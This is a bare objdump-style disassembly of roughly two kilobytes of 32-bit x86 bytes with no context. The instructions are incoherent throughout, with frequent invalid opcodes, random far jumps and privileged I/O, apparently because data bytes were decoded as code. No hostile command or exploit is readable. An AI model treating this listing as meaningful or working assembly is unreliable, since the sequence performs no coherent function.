  43e7f1:	adc    al,BYTE PTR [edx+0x7b545cf2]
  43e7f7:	sub    dl,ah
  43e7f9:	(bad)  
  43e7fa:	loope  0x43e77e
  43e7fc:	inc    edi
  43e7fd:	(bad)  
  43e7fe:	pop    eax
  43e7ff:	shr    BYTE PTR [esp+esi*2],cl
  43e802:	push   eax
  43e803:	push   edi
  43e804:	pop    esp
  43e805:	aad    0xf8
  43e807:	mov    dl,0x21
  43e809:	or     BYTE PTR [edi+0x12cf44ae],al
  43e80f:	mov    al,0xb1
  43e811:	loope  0x43e85d
  43e813:	push   esp
  43e814:	jmp    FWORD PTR [ebx+edx*8]
  43e817:	cwde   
  43e818:	leave  
  43e819:	xor    eax,0x93e34b82
  43e81e:	mov    ds:0x7a40066a,al
  43e823:	mov    edx,0xd9ad4dad
  43e828:	inc    edx
  43e829:	dec    ebx
  43e82a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e82b:	push   0xffffffab
  43e82d:	loop   0x43e879
  43e82f:	mov    dl,0xcc
  43e831:	xor    cl,BYTE PTR ds:0xa61f40d2
  43e837:	mov    bh,0x38
  43e839:	shl    BYTE PTR [esp+eiz*2+0x54],0x5
  43e83e:	mov    WORD PTR ds:[eax-0x2c],?
  43e842:	xchg   ebx,eax
  43e843:	and    BYTE PTR [ecx],0x27
  43e846:	adc    eax,0xeef68701
  43e84b:	mov    esi,0xb481dca9
  43e850:	jne    0x43e85a
  43e852:	retf   0xee14
  43e855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e856:	pop    ebx
  43e857:	js     0x43e897
  43e859:	add    DWORD PTR [ebx],ebp
  43e85b:	lods   eax,DWORD PTR ds:[esi]
  43e85c:	xor    BYTE PTR [ebx-0x45e11b11],ah
  43e862:	jecxz  0x43e809
  43e864:	aam    0x1a
  43e866:	jp     0x43e7f5
  43e868:	xor    BYTE PTR [eax+0x14],0x8c
  43e86c:	sub    BYTE PTR [edx+0x78a300f8],cl
  43e872:	xlat   BYTE PTR ds:[ebx]
  43e873:	ds loope 0x43e8b8
  43e876:	js     0x43e88c
  43e878:	mov    cl,0x1d
  43e87a:	xchg   esp,eax
  43e87b:	ret    0x2c1c
  43e87e:	pop    ds
  43e87f:	jb     0x43e8ce
  43e881:	and    al,0x96
  43e883:	pop    edx
  43e884:	sub    esi,DWORD PTR [esi]
  43e886:	repnz inc eax
  43e888:	xor    ah,dl
  43e88a:	daa    
  43e88b:	jb     0x43e83d
  43e88d:	or     BYTE PTR [edi+0x49ba2eda],0x5a
  43e894:	jl     0x43e832
  43e896:	scas   eax,DWORD PTR es:[edi]
  43e897:	sub    BYTE PTR [ebp-0x658d5dc8],ch
  43e89d:	push   es
  43e89e:	clc    
  43e89f:	sahf   
  43e8a0:	sahf   
  43e8a1:	sbb    al,0xb6
  43e8a3:	cmp    eax,0x11425509
  43e8a8:	add    dh,BYTE PTR [eax]
  43e8aa:	sbb    al,0x98
  43e8ac:	xchg   ebx,eax
  43e8ad:	or     ch,BYTE PTR [edx-0x2d]
  43e8b0:	pop    es
  43e8b1:	mov    al,ds:0x10ae9ee4
  43e8b6:	adc    esi,DWORD PTR [ebx]
  43e8b8:	mov    dh,0xa0
  43e8ba:	js     0x43e900
  43e8bc:	in     al,0x33
  43e8be:	(bad)  [esi-0x5ea59800]
  43e8c4:	jle    0x43e930
  43e8c6:	lods   al,BYTE PTR fs:[esi]
  43e8c8:	hlt    
  43e8c9:	nop
  43e8ca:	xchg   BYTE PTR [esi+0x5986eda1],ch
  43e8d0:	xor    al,0x58
  43e8d2:	(bad)  
  43e8d3:	adc    al,0x10
  43e8d5:	cmp    DWORD PTR [eax+0x36],esp
  43e8d8:	aam    0xb4
  43e8da:	inc    esi
  43e8db:	adc    BYTE PTR ds:0x564556a9,0x9d
  43e8e2:	mov    esi,0x68985ef7
  43e8e7:	sub    ebx,edx
  43e8e9:	push   edi
  43e8ea:	lods   al,BYTE PTR ds:[esi]
  43e8eb:	mov    eax,0xe2fa6d5e
  43e8f0:	(bad)  
  43e8f1:	ret    0x8911
  43e8f4:	in     eax,dx
  43e8f5:	in     al,0xab
  43e8f7:	mov    esi,0xb3104eba
  43e8fc:	pminub mm3,QWORD PTR [edx]
  43e8ff:	scas   al,BYTE PTR es:[edi]
  43e900:	fs pop edx
  43e902:	add    BYTE PTR [ebx],ch
  43e904:	out    0xc1,al
  43e906:	call   0xd76c:0xb2e61b7f
  43e90d:	add    ebp,DWORD PTR [ecx-0x13e9f9f3]
  43e913:	inc    ebp
  43e914:	std    
  43e915:	pop    esi
  43e916:	push   ds
  43e917:	sbb    edx,DWORD PTR ds:0xa4333032
  43e91d:	xor    cl,BYTE PTR [esi-0x5bb0aa1a]
  43e923:	push   eax
  43e924:	sub    DWORD PTR [edx-0x3e],eax
  43e927:	pop    es
  43e928:	add    BYTE PTR [esi-0x39240f2c],bh
  43e92e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e92f:	popa   
  43e930:	cmp    al,0xce
  43e932:	inc    esp
  43e933:	enter  0xa06f,0x3
  43e937:	(bad)  
  43e938:	daa    
  43e939:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e93a:	popa   
  43e93b:	js     0x43e8c8
  43e93d:	int3   
  43e93e:	add    al,0x9e
  43e940:	push   0x3a5acdcc
  43e945:	sub    al,BYTE PTR [esp+eax*4+0x784f5204]
  43e94c:	inc    esp
  43e94d:	fnsave [eax]
  43e94f:	sbb    cl,BYTE PTR [edx-0x7d61aefe]
  43e955:	mov    ds:0x67a89380,al
  43e95a:	adc    DWORD PTR [eax+0x48],edx
  43e95d:	jmp    0xf890:0x2c34102
  43e964:	dec    eax
  43e965:	mov    esp,0x49d24ec7
  43e96a:	dec    esi
  43e96b:	cmp    DWORD PTR [ecx+0x24b88037],esp
  43e971:	sub    eax,0x88484668
  43e976:	int3   
  43e977:	push   ds
  43e978:	lea    edx,[ebp+0xf605a50]
  43e97e:	add    BYTE PTR [eax],ch
  43e980:	mov    ebp,0xd8f31858
  43e985:	call   0x6cfb:0xa03fc379
  43e98c:	add    BYTE PTR [esi+0x67809e],al
  43e992:	or     DWORD PTR [esi-0x6],0x201fbf2
  43e999:	sbb    esp,DWORD PTR [edx-0x44]
  43e99c:	test   DWORD PTR [edx-0x30],edi
  43e99f:	dec    ebp
  43e9a0:	sub    cl,cl
  43e9a2:	mov    edx,0xb80f5825
  43e9a7:	cli    
  43e9a8:	push   0xffffff94
  43e9aa:	or     BYTE PTR [edx],0x5a
  43e9ad:	data16 adc al,0x5e
  43e9b0:	xchg   BYTE PTR [eax],dh
  43e9b2:	inc    eax
  43e9b3:	cmp    BYTE PTR [eax],dl
  43e9b5:	data16 into 
  43e9b7:	cli    
  43e9b8:	push   esi
  43e9b9:	jno    0x43ea04
  43e9bb:	sub    eax,0x4c8439d8
  43e9c0:	cmp    esi,ebp
  43e9c2:	mov    al,ah
  43e9c4:	or     BYTE PTR [ebp+0x5f],0xd0
  43e9c8:	and    BYTE PTR [edx+ecx*4+0xa],dl
  43e9cc:	cli    
  43e9cd:	cwde   
  43e9ce:	xchg   edx,eax
  43e9cf:	scas   al,BYTE PTR es:[edi]
  43e9d0:	add    eax,0x9f90243d
  43e9d5:	imul   BYTE PTR [edx-0x497fa0e0]
  43e9db:	(bad)  
  43e9dc:	mov    dl,0xdb
  43e9de:	push   0x65
  43e9e0:	jl     0x43e9b7
  43e9e2:	cs sbb DWORD PTR fs:[ecx-0x2993eb33],eax
  43e9ea:	cwde   
  43e9eb:	jmp    0x126f:0x4a2869ae
  43e9f2:	ds dec edx
  43e9f4:	jp     0x43e9ac
  43e9f6:	and    BYTE PTR [esi+0x78],ah
  43e9f9:	aas    
  43e9fa:	loop   0x43e9dc
  43e9fc:	add    esp,DWORD PTR [edi+ecx*8+0x309f1ccc]
  43ea03:	scas   al,BYTE PTR es:[edi]
  43ea04:	(bad)  
  43ea05:	jge    0x43ea12
  43ea07:	js     0x43ea36
  43ea09:	faddp  st(6),st
  43ea0b:	xor    al,0xd4
  43ea0d:	mov    esp,0x49c1a822
  43ea12:	int3   
  43ea13:	push   0xea1606f
  43ea18:	sti    
  43ea19:	add    ch,0xcc
  43ea1c:	push   ss
  43ea1d:	xchg   esi,eax
  43ea1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ea1f:	cld    
  43ea20:	(bad)  [ebp-0x50]
  43ea23:	lgdtd  [edx+edx*8-0x3f]
  43ea28:	inc    eax
  43ea29:	enter  0x3f80,0x47
  43ea2d:	push   edx
  43ea2e:	scas   eax,DWORD PTR es:[edi]
  43ea2f:	add    DWORD PTR [edx-0x31d1083],esp
  43ea35:	push   ebp
  43ea36:	dec    ebp
  43ea37:	ror    ebx,0x6c
  43ea3a:	int3   
  43ea3b:	jle    0x43ea6a
  43ea3d:	add    BYTE PTR [eax],ah
  43ea3f:	add    BYTE PTR [ebp-0x7eebff36],bl
  43ea45:	(bad)  
  43ea47:	or     ebx,ecx
  43ea49:	fidiv  WORD PTR [ebx]
  43ea4b:	xchg   edx,eax
  43ea4c:	push   0x0
  43ea4e:	mov    ds:0xd151d092,eax
  43ea53:	mov    eax,0x43d8b0f4
  43ea58:	dec    ebx
  43ea59:	inc    eax
  43ea5a:	aas    
  43ea5b:	xor    al,0x48
  43ea5d:	sub    dh,BYTE PTR ds:0xe1b1705e
  43ea63:	adc    eax,eax
  43ea65:	lahf   
  43ea66:	icebp  
  43ea67:	out    dx,al
  43ea68:	pusha  
  43ea69:	cwde   
  43ea6a:	push   es
  43ea6b:	mov    dl,0x4d
  43ea6d:	arpl   di,ax
  43ea6f:	or     eax,0x76d44235
  43ea75:	inc    edx
  43ea76:	stos   DWORD PTR es:[edi],eax
  43ea77:	adc    al,0x74
  43ea79:	clc    
  43ea7a:	out    0x96,al
  43ea7c:	stc    
  43ea7d:	retf   0x5638
  43ea80:	fs jecxz 0x43ea46
  43ea83:	mov    al,0x7c
  43ea85:	out    0xf0,al
  43ea87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ea88:	add    al,0xe8
  43ea8a:	add    DWORD PTR [ebp-0x538b37ef],0xf8d05e94
  43ea94:	push   es
  43ea95:	popa   
  43ea96:	std    
  43ea97:	sbb    cl,BYTE PTR [eax+0x71]
  43ea9a:	lea    esp,[edx+0xa]
  43ea9d:	(bad)  
  43ea9e:	out    0xbe,al
  43eaa0:	push   esp
  43eaa1:	or     BYTE PTR [esi-0x1b],dl
  43eaa4:	rcl    BYTE PTR [ecx],0x12
  43eaa7:	in     eax,0x6a
  43eaa9:	xor    BYTE PTR [esi+0x58],dl
  43eaac:	inc    edx
  43eaad:	dec    ebx
  43eaae:	xlat   BYTE PTR ds:[ebx]
  43eaaf:	rcr    BYTE PTR [ebx+0x6e],0x96
  43eab3:	and    edx,DWORD PTR [edx-0x7fff8523]
  43eab9:	sub    eax,0x634e4bea
  43eabe:	(bad)  
  43eabf:	cmc    
  43eac0:	add    BYTE PTR [eax],al
  43eac2:	pushf  
  43eac3:	xor    al,0xe0
  43eac5:	mov    gs,WORD PTR cs:[eax]
  43eac8:	jl     0x43ea5a
  43eaca:	mov    dh,0x9
  43eacc:	push   ss
  43eacd:	jl     0x43eae4
  43eacf:	inc    esp
  43ead0:	dec    ebp
  43ead1:	fs dec eax
  43ead3:	add    edi,DWORD PTR [ebx]
  43ead5:	mov    esi,0x67ea8ce6
  43eada:	xchg   edi,eax
  43eadb:	mov    al,0xe1
  43eadd:	sar    DWORD PTR [eax+0x12],cl
  43eae0:	clc    
  43eae1:	sub    al,BYTE PTR [esi]
  43eae3:	pop    esi
  43eae4:	jp     0x43eb4f
  43eae6:	mov    ebp,ss
  43eae8:	push   edx
  43eae9:	jl     0x43eb0f
  43eaeb:	loop   0x43eabf
  43eaed:	and    eax,0xa04f464c
  43eaf2:	jbe    0x43eb60
  43eaf4:	add    dh,BYTE PTR [eax-0x9f353e2]
  43eafa:	add    al,BYTE PTR [edi+esi*4+0x40]
  43eafe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43eaff:	xchg   BYTE PTR [ebx+edi*1+0xf032176],dh
  43eb06:	test   al,0xa4
  43eb08:	xchg   edx,eax
  43eb09:	or     DWORD PTR [edx],eax
  43eb0b:	add    edx,DWORD PTR [ebp-0x77]
  43eb0e:	test   BYTE PTR [edx-0x2a],0x88
  43eb12:	fwait
  43eb13:	ins    BYTE PTR es:[edi],dx
  43eb14:	cwde   
  43eb15:	mov    dl,0xb
  43eb17:	add    DWORD PTR [ebp-0x55e80315],ebp
  43eb1d:	hlt    
  43eb1e:	cs add dh,dh
  43eb21:	sub    eax,ebp
  43eb23:	push   ebx
  43eb24:	rcl    BYTE PTR ds:0x6ce8a2cf,0x7c
  43eb2b:	and    al,0xd0
  43eb2d:	mov    dh,0xc4
  43eb2f:	shr    DWORD PTR cs:[ecx],0xa
  43eb33:	and    BYTE PTR ds:0xdc13028e,ch
  43eb39:	add    BYTE PTR [eax-0x58],0xb5
  43eb3d:	dec    edi
  43eb3e:	mov    ah,0x10
  43eb40:	cmc    
  43eb41:	fwait
  43eb42:	inc    esi
  43eb43:	xor    al,0xca
  43eb45:	mov    dl,al
  43eb47:	es call 0x7024194d
  43eb4d:	jg     0x43ead2
  43eb4f:	pop    ebx
  43eb50:	not    BYTE PTR [eax+0x8]
  43eb53:	jno    0x43eb9e
  43eb55:	cli    
  43eb56:	lock xor ch,BYTE PTR [ebx]
  43eb59:	adc    BYTE PTR [ebx-0x7b5ff2c0],cl
  43eb5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43eb60:	hlt    
  43eb61:	and    BYTE PTR [eax-0x3f71bed0],ah
  43eb67:	push   es
  43eb68:	les    esp,FWORD PTR [esi-0x536a979b]
  43eb6e:	call   0x49ca65cb
  43eb73:	xor    al,0xb5
  43eb75:	mov    eax,ds:0xf046546a
  43eb7a:	xchg   ebp,eax
  43eb7b:	ss inc ebp
  43eb7d:	xchg   ebp,eax
  43eb7e:	and    al,0xd5
  43eb80:	push   ss
  43eb81:	add    al,0x92
  43eb84:	jmp    0x4ff:0xc01087d2
  43eb8b:	jle    0x43eb29
  43eb8d:	xor    edx,DWORD PTR [ebp-0xb]
  43eb90:	add    al,dl
  43eb92:	aad    0x58
  43eb94:	mov    ah,0x67
  43eb96:	mov    dl,0x2f
  43eb98:	stos   BYTE PTR es:[edi],al
  43eb99:	push   ebx
  43eb9a:	shl    BYTE PTR [ebp+0x62],1
  43eb9d:	(bad)  
  43eb9e:	fmul   QWORD PTR [eax]
  43eba0:	ins    BYTE PTR es:[edi],dx
  43eba1:	mov    ch,0x9
  43eba3:	sbb    ah,BYTE PTR [ebx+esi*1+0xa47e855]
  43ebaa:	sbb    al,0xb2
  43ebac:	push   cs
  43ebad:	push   edx
  43ebae:	push   ds
  43ebaf:	hlt    
  43ebb0:	fidivr WORD PTR [esp+eax*2+0x20]
  43ebb4:	sbb    bh,BYTE PTR [edx]
  43ebb6:	xlat   BYTE PTR ss:[ebx]
  43ebb8:	je     0x43eba9
  43ebba:	jmp    0x7ce8:0x34a6aa81
  43ebc1:	adc    eax,0xc9ededa8
  43ebc6:	call   0x73361ffd
  43ebcb:	ss xchg esp,eax
  43ebcd:	jns    0x43ebcf
  43ebcf:	sbb    BYTE PTR [edx*1+0x6018cae2],al
  43ebd6:	add    DWORD PTR [ecx+0x203e6b6a],ebp
  43ebdc:	xor    al,0x94
  43ebde:	adc    eax,0x3d561f1d
  43ebe3:	mov    BYTE PTR [edi],ch
  43ebe5:	jb     0x43ec48
  43ebe7:	mov    eax,0x9f5a47dd
  43ebec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ebed:	xchg   esp,eax
  43ebee:	jl     0x43ebaf
  43ebf0:	loopne 0x43ec10
  43ebf2:	ret    
  43ebf3:	xor    edx,ebp
  43ebf5:	fucompp 
  43ebf7:	jnp    0x43ec33
  43ebf9:	(bad)  
  43ebfa:	sub    BYTE PTR [esi],al
  43ebfc:	mov    eax,0xe1508675
  43ec01:	test   BYTE PTR [edx-0x52],bl
  43ec04:	(bad)  
  43ec05:	mov    eax,0x13e1b220
  43ec0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ec0b:	mov    ds:0xe857f2d6,al
  43ec10:	push   ecx
  43ec11:	clc    
  43ec12:	jecxz  0x43ec4a
  43ec14:	or     ecx,edi
  43ec16:	shl    BYTE PTR [esi],cl
  43ec18:	mov    dh,ch
  43ec1a:	rcr    BYTE PTR [edx],1
  43ec1c:	lods   al,BYTE PTR ds:[esi]
  43ec1d:	xchg   ebp,eax
  43ec1e:	mov    al,ds:0x7cdc066d
  43ec23:	mov    bl,0xc
  43ec25:	cs push ecx
  43ec27:	dec    eax
  43ec28:	dec    eax
  43ec29:	lods   eax,DWORD PTR ds:[esi]
  43ec2a:	add    DWORD PTR [ebx+edx*2+0x6b],0x28
  43ec2f:	loop   0x43ebbd
  43ec31:	cmp    BYTE PTR [edx],ah
  43ec33:	fidivr DWORD PTR [ebp-0x2f9ba92e]
  43ec39:	jp     0x43eca8
  43ec3b:	adc    BYTE PTR [ebx],dh
  43ec3d:	ficomp WORD PTR [edx-0x15]
  43ec40:	add    DWORD PTR [ecx],eax
  43ec42:	fwait
  43ec43:	or     BYTE PTR [esp+esi*1+0x771ce89e],dl
  43ec4a:	pop    DWORD PTR [esi+esi*4+0x22103203]
  43ec51:	scas   al,BYTE PTR es:[edi]
  43ec52:	xchg   edx,eax
  43ec53:	sub    cl,BYTE PTR [ecx]
  43ec55:	sub    edi,DWORD PTR [edx-0x435fecfe]
  43ec5b:	cmc    
  43ec5c:	arpl   WORD PTR [edx],sp
  43ec5e:	out    dx,eax
  43ec5f:	pop    edi
  43ec60:	dec    edx
  43ec61:	or     eax,0x991c11ed
  43ec66:	and    dl,ch
  43ec68:	jp     0x43ec66
  43ec6a:	stos   BYTE PTR es:[edi],al
  43ec6b:	ins    DWORD PTR es:[edi],dx
  43ec6c:	add    eax,0x81a2922a
  43ec71:	sbb    BYTE PTR cs:[esi-0x3dc13912],bl
  43ec78:	clc    
  43ec79:	sub    DWORD PTR [ebx+edi*1],ecx
  43ec7c:	jbe    0x43ec74
  43ec7e:	jmp    0x7080:0x47801412
  43ec85:	repz stc 
  43ec87:	cmp    BYTE PTR [esi],0x61
  43ec8a:	jnp    0x43ece0
  43ec8c:	pushf  
  43ec8d:	fs and eax,0x4316e03
  43ec93:	fwait
  43ec94:	add    al,0x99
  43ec96:	xor    DWORD PTR [esp+edi*8-0x4fa47ab6],ebx
  43ec9d:	pop    ebp
  43ec9e:	mov    DWORD PTR [eax+0x28],ebp
  43eca1:	and    BYTE PTR [esi-0x4f],0xf4
  43eca5:	bnd call 0x12db59b2
  43ecab:	push   edx
  43ecac:	inc    edx
  43ecad:	xchg   esp,eax
  43ecae:	mov    BYTE PTR [ebp+0x41eda456],ch
  43ecb4:	mov    dh,0xa9
  43ecb7:	inc    eax
  43ecb8:	scas   eax,DWORD PTR es:[edi]
  43ecb9:	les    ebx,FWORD PTR [ebp+0x29]
  43ecbc:	cmc    
  43ecbd:	and    ecx,esp
  43ecbf:	cmp    DWORD PTR [edx-0x40],0xffffffb3
  43ecc3:	lods   al,BYTE PTR ds:[esi]
  43ecc4:	add    DWORD PTR [edx],0x58
  43ecc7:	mov    al,ds:0x229c4a96
  43eccc:	push   edi
  43eccd:	xor    ebx,DWORD PTR cs:[edx]
  43ecd0:	cmp    al,dh
  43ecd2:	int3   
  43ecd3:	push   ds
  43ecd4:	ficom  DWORD PTR [eax]
  43ecd6:	jp     0x43ed1d
  43ecd8:	ins    DWORD PTR es:[edi],dx
  43ecd9:	(bad)  
  43ecda:	fmul   DWORD PTR [ecx-0xa85a962]
  43ece0:	adc    eax,DWORD PTR [esi]
  43ece2:	pop    esi
  43ece3:	mov    al,ds:0x750e7330
  43ece8:	jg     0x43ec8a
  43ecea:	mov    eax,ds:0x19d280bd
  43ecef:	lods   al,BYTE PTR ds:[esi]
  43ecf0:	mov    ds,WORD PTR [ecx]
  43ecf2:	(bad)  
  43ecf3:	lods   eax,DWORD PTR ds:[esi]
  43ecf4:	aam    0x61
  43ecf6:	clc    
  43ecf7:	sub    DWORD PTR [eax+0xa],esp
  43ecfa:	das    
  43ecfb:	push   esi
  43ecfc:	sbb    BYTE PTR [esi],al
  43ecfe:	icebp  
  43ecff:	ret    
  43ed00:	test   BYTE PTR [ecx+0x4a],cl
  43ed03:	push   cs
  43ed04:	mov    al,ds:0x6c9e20f8
  43ed09:	cld    
  43ed0a:	add    BYTE PTR [ecx*8+0x58c7fae2],dh
  43ed11:	or     eax,DWORD PTR [eax+edx*4]
  43ed14:	xchg   esp,eax
  43ed15:	jb     0x43ecb3
  43ed17:	lods   eax,DWORD PTR ds:[esi]
  43ed18:	loopne 0x43ed25
  43ed1a:	shr    BYTE PTR [edi-0x2c],cl
  43ed1d:	adc    cl,bh
  43ed1f:	mov    edx,0xa1da812b
  43ed24:	mov    ch,0xd2
  43ed26:	mov    al,0xd4
  43ed28:	aam    0x9e
  43ed2a:	push   ss
  43ed2b:	mov    cl,BYTE PTR [esi+esi*4]
  43ed2e:	mov    ecx,0x526b5961
  43ed33:	push   esi
  43ed34:	add    BYTE PTR [edi],0x85
  43ed37:	pop    esi
  43ed38:	sub    dl,BYTE PTR [eax]
  43ed3a:	inc    edx
  43ed3b:	add    esp,edi
  43ed3d:	push   ss
  43ed3e:	lock add al,0xa1
  43ed41:	or     ah,BYTE PTR [esi+ebp*8+0x4e]
  43ed45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ed46:	push   ss
  43ed47:	fsub   DWORD PTR [esi-0x19e9af4e]
  43ed4d:	cmp    DWORD PTR [edx-0x48aa6d64],eax
  43ed53:	mov    al,ds:0x47c03607
  43ed58:	sti    
  43ed59:	push   ss
  43ed5a:	dec    ecx
  43ed5b:	aas    
  43ed5c:	and    eax,0x3ceba1e0
  43ed61:	test   DWORD PTR cs:[ebx+0x166b848a],ecx
  43ed68:	outs   dx,DWORD PTR ds:[esi]
  43ed69:	dec    esi
  43ed6a:	inc    ebx
  43ed6b:	xchg   BYTE PTR ds:0x6a0df800,dl
  43ed71:	repz mov esi,0x359a00ad
  43ed77:	add    esp,edi
  43ed79:	xor    DWORD PTR [eax+0x5],ebp
  43ed7c:	push   0x2fa60533
  43ed81:	call   0xfb44:0x9ae2bbb1
  43ed88:	call   0x60cc:0x276639f
  43ed8f:	std    
  43ed90:	and    BYTE PTR es:[esi-0x5c],0x70
  43ed95:	mov    dh,0x75
  43ed97:	jae    0x43ed45
  43ed99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43ed9a:	push   ds
  43ed9b:	mov    ds:0x9d82a5ac,eax
  43eda0:	inc    ecx
  43eda1:	(bad)  
  43eda2:	jo     0x43ee04
  43eda4:	arpl   WORD PTR [ecx],sp
  43eda6:	(bad)  
  43eda7:	dec    ebp
  43eda8:	lahf   
  43eda9:	xor    dh,dh
  43edab:	pop    edx
  43edac:	imul   edx,DWORD PTR [esi-0x1d30e52f],0x36
  43edb3:	mov    eax,0x14f55888
  43edb8:	add    BYTE PTR [edi-0x205525cc],0x78
  43edbf:	ins    BYTE PTR es:[edi],dx
  43edc0:	arpl   WORD PTR [ebx-0x501d2e32],di
  43edc6:	ins    DWORD PTR es:[edi],dx
  43edc7:	push   esp
  43edc8:	test   ecx,edx
  43edca:	ss adc al,0x1c
  43edcd:	mov    eax,DWORD PTR [edi+edx*1-0x21252b32]
  43edd4:	ror    DWORD PTR ds:0x1416070d,cl
  43edda:	fs loopne 0x43edf6
  43eddd:	xor    ah,BYTE PTR [eax]
  43eddf:	push   eax
  43ede0:	pop    ebx
  43ede1:	xor    eax,DWORD PTR [edx-0x6c]
  43ede4:	sbb    al,0xa7
  43ede6:	les    edx,FWORD PTR [ebx]
  43ede8:	call   0x22fe:0x2386c4c8
  43edef:	repnz adc al,0xf6
  43edf2:	mov    al,0x7e
  43edf4:	jmp    0x348d:0xf2ab4ee8
  43edfb:	xor    al,0x74
  43edfd:	sub    ah,BYTE PTR [ebx-0x78]
  43ee00:	(bad)  
  43ee02:	scas   al,BYTE PTR es:[edi]
  43ee03:	leave  
  43ee04:	mov    esp,0xc0e16cbc
  43ee09:	(bad)  
  43ee0a:	(bad)  
  43ee0b:	cmp    al,0x88
  43ee0d:	dec    ebp
  43ee0e:	ret    0xb07a
  43ee11:	push   esp
  43ee12:	outs   dx,BYTE PTR ds:[esi]
  43ee13:	xchg   edi,eax
  43ee14:	pusha  
  43ee15:	scas   al,BYTE PTR es:[edi]
  43ee16:	dec    edx
  43ee17:	daa    
  43ee18:	test   eax,0x22ea50a9
  43ee1d:	and    edx,0xffffffe0
  43ee20:	retf   
  43ee21:	shl    BYTE PTR [edx+0x7a],1
  43ee24:	dec    edi
  43ee25:	ins    DWORD PTR es:[edi],dx
  43ee26:	inc    eax
  43ee27:	shl    BYTE PTR [ecx],0x88
  43ee2a:	push   ebp
  43ee2b:	add    dl,BYTE PTR [esi+0x7e]
  43ee2e:	cld    
  43ee2f:	cmp    eax,DWORD PTR [eax-0x25c5e5c5]
  43ee35:	mov    ah,0x34
  43ee37:	fimul  DWORD PTR [edx-0x3ffed909]
  43ee3d:	loope  0x43ee02
  43ee3f:	push   es
  43ee40:	adc    cl,BYTE PTR ds:0xc54c00cd
  43ee46:	jp     0x43eeba
  43ee48:	hlt    
  43ee49:	(bad)  
  43ee4a:	mov    DWORD PTR [edi+0x745025a8],0xb5d6f106
  43ee54:	data16 or cl,BYTE PTR [ebx-0x80]
  43ee58:	or     cl,0x1c
  43ee5b:	adc    BYTE PTR [esi+ebp*4+0x5fcab454],al
  43ee62:	pop    ebp
  43ee63:	es (bad) 
  43ee65:	mov    ah,0xf9
  43ee67:	arpl   WORD PTR [ecx],cx
  43ee69:	adc    eax,0xf410ca15
  43ee6e:	inc    esi
  43ee6f:	hlt    
  43ee70:	mov    dl,0x3e
  43ee72:	sbb    eax,eax
  43ee74:	rol    BYTE PTR [eax-0x6e],0x4
  43ee78:	clc    
  43ee79:	add    edx,DWORD PTR [eax+0x9]
  43ee7c:	xchg   edi,eax
  43ee7d:	test   BYTE PTR [ecx+0x2cf8d3d6],cl
  43ee83:	test   al,0x44
  43ee85:	jge    0x43ee65
  43ee87:	mov    cl,0x51
  43ee89:	lea    ecx,[edi]
  43ee8b:	push   es
  43ee8c:	ds lock pusha 
  43ee8f:	ins    DWORD PTR es:[edi],dx
  43ee90:	inc    esp
  43ee91:	std    
  43ee92:	mov    edi,0x11e0688e
  43ee97:	mov    ah,0x31
  43ee99:	retf   
  43ee9a:	(bad)  
  43ee9b:	hlt    
  43ee9c:	add    DWORD PTR [eax-0x63],ebp
  43ee9f:	and    BYTE PTR [esi+0x1f],0x28
  43eea3:	jmp    0x7dfa8f29
  43eea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43eea9:	mov    WORD PTR [esi-0x606b7e8d],?
  43eeaf:	adc    BYTE PTR [ebx-0x40],al
  43eeb2:	addr16 jmp 0x41b81048
  43eeb8:	dec    esp
  43eeb9:	inc    eax
  43eeba:	cmp    al,BYTE PTR [esi]
  43eebc:	icebp  
  43eebd:	cmp    BYTE PTR [ecx-0x30],0x1c
  43eec1:	or     BYTE PTR ss:[eax+ebp*8],ch
  43eec5:	jo     0x43ef37
  43eec7:	data16 fadd st(6),st
  43eeca:	dec    BYTE PTR [ebp-0xc]
  43eecd:	sub    bl,ch
  43eecf:	and    esp,esp
  43eed1:	push   eax
  43eed2:	xchg   edx,eax
  43eed3:	(bad)  
  43eed4:	aad    0xa0
  43eed6:	mov    ds:0xc6eb6a5,al
  43eedb:	push   esi
  43eedc:	inc    ebx
  43eedd:	xor    ebp,edx
  43eedf:	bound  ebp,QWORD PTR [eax]
  43eee1:	push   esi
  43eee2:	aas    
  43eee3:	enter  0x1457,0x84
  43eee7:	not    BYTE PTR [ecx-0x5f504752]
  43eeed:	hlt    
  43eeee:	inc    esi
  43eeef:	pop    ebx
  43eef0:	jo     0x43ef6c
  43eef2:	(bad)  
  43eef3:	out    dx,eax
  43eef4:	add    al,0xf0
  43eef6:	and    DWORD PTR ds:0xd866d810,esp
  43eefc:	fdivr  QWORD PTR [edx]
  43eefe:	push   0x45
  43ef00:	ins    BYTE PTR es:[edi],dx
  43ef01:	or     al,0x4b
  43ef03:	fnsave [eax+0x40f12270]
  43ef09:	sar    ah,1
  43ef0b:	es call 0x20995a0e
  43ef11:	push   es
  43ef12:	cmp    ah,dh
  43ef14:	pushf  
  43ef15:	mov    eax,0xf810f12e
  43ef1a:	dec    esp
  43ef1b:	add    ah,al
  43ef1d:	push   edi
  43ef1e:	adc    DWORD PTR ds:0x647849b1,edx
  43ef24:	or     bl,dl
  43ef26:	ja     0x43ef70
  43ef28:	shr    BYTE PTR [edi+0x10],1
  43ef2b:	in     eax,dx
  43ef2c:	repnz leave 
  43ef2e:	push   0x43
  43ef30:	xor    al,0x13
  43ef32:	clc    
  43ef33:	add    al,0xd6
  43ef35:	or     al,0xba
  43ef37:	les    eax,FWORD PTR [edx-0x68]
  43ef3a:	push   ss
  43ef3b:	and    BYTE PTR [edx+ebx*1],dh
  43ef3e:	dec    esi
  43ef3f:	adc    BYTE PTR [edi],bl
  43ef41:	mov    ds:0x6ae6810e,al
  43ef46:	js     0x43ef5a
  43ef48:	cmp    dh,0xbe
  43ef4b:	test   al,0x50
  43ef4d:	pop    ecx
  43ef4e:	scas   al,BYTE PTR es:[edi]
  43ef4f:	pusha  
  43ef50:	jne    0x43efa4
